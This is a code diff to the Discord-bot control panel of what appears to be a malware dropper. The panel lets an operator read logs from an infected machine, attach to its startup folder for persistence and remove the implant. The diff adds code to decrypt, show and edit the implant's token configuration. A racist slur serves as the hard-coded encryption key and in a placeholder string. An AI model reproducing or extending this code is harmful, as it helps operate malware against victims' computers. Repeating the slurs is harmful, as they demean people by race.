@@ -10,6 +10,8 @@ from core.logEntry import log_entries
 from helpers.attach import *
 from helpers.network import Network
 from helpers.uninstall import uninstall
+import helpers.source as source
+from discord import ui
 
 class confirm(discord.ui.View):
   def __init__(self):
@@ -74,7 +76,7 @@ class Dropper(discord.ui.Select):
             discord.SelectOption(label='Log', description='Access the \"thing\"\'s logs', emoji='📝', value="log"),
             discord.SelectOption(label='Attach', description='Attempt attaching to the startup folder', emoji='📎', value="attach"),
             discord.SelectOption(label='Uninstall', description='Delete the \"thing\" from the target completely', emoji='❌', value="remove"), 
-            discord.SelectOption(label='Edit Config source', description='Edit the source of the json configuration file', emoji='⚙', value="config"), 
+            discord.SelectOption(label='Edit/view Config source', description='Edit the source of the json configuration file', emoji='⚙', value="config"), 
         ]
     
         super().__init__(placeholder='cool droppa', options=options, min_values=1, max_values=1)
@@ -164,7 +166,17 @@ class Dropper(discord.ui.Select):
           elif so == "remove":
               embed = discord.Embed(description=f"⭕ | ARE YOU 100% sure??", color=discord.Color.orange())  
               await interaction.response.send_message(embed=embed, view=confirm())           
-          else:
+          elif so == "config":
+            rawdata = ""
+            rawdata = source.read()
+            data = source.dec(rawdata, "ihateniggers1940_1800")
+            
+            tokenstr = "\n> ".join(f"`\"{token}\"`" for token in data['tokens'])
+            if not tokenstr:
+                tokenstr = "*empty*"
+            embed = discord.Embed(title="Config source", description=f"Current stamped version: `{data['version']}`\n**Tokens**:\n> {tokenstr}", color=config.embedcolor)
+            await interaction.response.edit_message(embed=embed, view=Dropperview(config=True))
+          else:    
               await interaction.response.send_message("soon inshallah", ephemeral=True)     
               
                      
@@ -234,8 +246,46 @@ class networkbtn(discord.ui.Button):
         embed.set_footer(text=f"Reclicking the button won't refresh")
         await interaction.response.send_message(embed=embed, ephemeral=True)         
             
+            
+
+
+class tokenmodal(ui.Modal, title='Add token'): 
+       def __init__(self):
+          super().__init__()
+
+       text = ui.TextInput(label='Token', max_length=128, required=True, placeholder="Mtmnigga1-69")
+
+       async def on_submit(self, interaction: discord.Interaction):
+           try:
+             embed = discord.Embed(description=f"Saving...", color=discord.Color.orange())
+             await interaction.response.edit_message(embed=embed, view=None)
+             rawdata = source.read()
+             if rawdata:
+               cookeddata = source.dec(rawdata, "ihateniggers1940_1800")
+               cookeddata['tokens'].append(self.text.value)
+               cookedsrc = source.enc(cookeddata, "ihateniggers1940_1800")
+               source.write(cookedsrc)
+               tokenstr = "\n> ".join(f"`\"{token}\"`" for token in cookeddata['tokens'])
+               embed = discord.Embed(title="Config source", description=f"Current stamped version: `{cookeddata['version']}`\n**Tokens**:\n> {tokenstr}", color=config.embedcolor)
+               await interaction.message.edit(embed=embed, view=Dropperview(config=True))
+             else:
+                 embed = discord.Embed(description=f"❌ | Failed to get source file", color=config.embederrorcolor)
+                 await interaction.response.send_message(embed=embed, ephemeral=True)
+           except Exception as e:
+               await Bot.error(interaction, Bot, e)  
+            
+class addtoken(discord.ui.Button):
+    def __init__(self):
+        super().__init__(
+            label="Add token",
+            style=discord.ButtonStyle.primary,
+        )
+
+    async def callback(self, interaction: discord.Interaction):   
+        await interaction.response.send_modal(tokenmodal())  
+            
 class Dropperview(discord.ui.View):
-    def __init__(self, log=None, network=None):
+    def __init__(self, log=None, network=None, config=False):
         super().__init__(timeout=None) 
         self.add_item(Dropper())
         if log:
@@ -243,6 +293,9 @@ class Dropperview(discord.ui.View):
             self.add_item(Refresh())
         if network:
             self.add_item(networkbtn(network))    
+        if config:
+            self.add_item(addtoken())    
+            
         
 
 @app_commands.command(name="panel", description="Control panel")
